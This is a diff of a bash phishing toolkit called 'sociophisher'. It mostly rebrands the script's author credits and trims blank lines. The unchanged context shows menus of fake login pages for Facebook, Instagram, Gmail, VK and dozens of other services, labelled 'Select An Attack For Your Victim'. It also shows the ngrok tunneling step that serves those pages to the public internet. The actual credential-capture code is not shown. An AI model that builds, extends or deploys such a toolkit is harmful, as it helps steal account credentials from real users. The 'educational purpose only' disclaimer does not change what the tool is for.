@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ##   sociophisher 	: 	Automated Phishing Tool
-##   Author     	: 	Raphael356
+##   Author     	: 	ALEX BIEBER
 ##   Version 	    : 	2.2
-##   Github 	    : 	https://github.com/Raphael356
+##   Github 	    : 	https://github.com/alexbieber
 
 
 
@@ -77,9 +77,8 @@ banner() {
 		${PINK}         | | |_____|  | |_) | | | | \__ \ | | |  __/ |      🔴🔴🔴🔴🔴🔴🔴🔴🔴
 		${PINK}|  ______| |          | |   |_| |_|_|___/_| |_|\___|_|   | |🔴🔴🔴🔴🔴🔴🔴🔴🔴
 		${PINK}  |________|          | |                                
-		${PINK}                      |_|                ${PINK}Version : 1.2
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Raphael356${WHITE}
+		${PINK}                      |_|                ${PINK}Version : 1.0
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by alexbieber (ALEX BIEBER)${WHITE}
 	EOF
 }
 
@@ -220,19 +219,15 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}Raphael356 ${RED}[ ${ORANGE}Raphael356 ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Raphael356
+		${GREEN}Author   ${RED}:  ${ORANGE}Alex Bieber ${RED}[ ${ORANGE}Alex-Bieber ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/alexbieber
 		${GREEN}Version  ${RED}:  ${ORANGE}2.2
-
 		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Raphael356,1RaY-1 ${RESETBG}
-
+								  DarkSecDevelopers,Alex Bieber,1RaY-1 ${RESETBG}
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
 		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
-
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
-
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${PINK} Select an option : ${BLUE}"
@@ -308,7 +303,7 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to ALEX BIEBER (https://github.com/alexbieber)
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
@@ -359,11 +354,9 @@ start_localhost() {
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
-
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
 		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
-
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
@@ -384,12 +377,10 @@ tunnel_menu() {
 ## Facebook
 site_facebook() {
 	cat <<- EOF
-
 		${RED}[${WHITE}01${RED}]${PINK} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${PINK} Advanced Voting Poll Login Page
 		${RED}[${WHITE}03${RED}]${PINK} Fake Security Login Page
 		${RED}[${WHITE}04${RED}]${PINK} Facebook Messenger Login Page
-
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${PINK} Select an option : ${BLUE}"
@@ -420,12 +411,10 @@ site_facebook() {
 ## Instagram
 site_instagram() {
 	cat <<- EOF
-
 		${RED}[${WHITE}01${RED}]${PINK} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${PINK} Auto Followers Login Page
 		${RED}[${WHITE}03${RED}]${PINK} 1000 Followers Login Page
 		${RED}[${WHITE}04${RED}]${PINK} Blue Badge Verify Login Page
-
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${PINK} Select an option : ${BLUE}"
@@ -456,11 +445,9 @@ site_instagram() {
 ## Gmail/Google
 site_gmail() {
 	cat <<- EOF
-
 		${RED}[${WHITE}01${RED}]${YELLOW} Gmail Old Login Page
 		${RED}[${WHITE}02${RED}]${YELLOW} Gmail New Login Page
 		${RED}[${WHITE}03${RED}]${YELLOW} Advanced Voting Poll
-
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${YELLOW} Select an option : ${BLUE}"
@@ -487,10 +474,8 @@ site_gmail() {
 ## Vk
 site_vk() {
 	cat <<- EOF
-
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -515,7 +500,6 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
-
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${PINK} Twitch       ${RED}[${WHITE}21${RED}]${YELLOW} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${PINK} Pinterest    ${RED}[${WHITE}22${RED}]${YELLOW} Badoo
 		${RED}[${WHITE}03${RED}]${YELLOW} Google        ${RED}[${WHITE}13${RED}]${BLUE} Snapchat     ${RED}[${WHITE}23${RED}]${YELLOW} Origin
@@ -527,9 +511,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${BLUE} Adobe        ${RED}[${WHITE}30${RED}]${PINK} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${PINK} Gitlab       ${RED}[${WHITE}33${RED}]${PINK} Github
-
 		${RED}[${WHITE}99${RED}]${PINK} About         ${RED}[${WHITE}00${RED}]${BLUE} Exit
-
 	EOF
 	
 	read -p "${RED}[${WHITE}-${RED}]${PINK} Select an option : ${BLUE}"
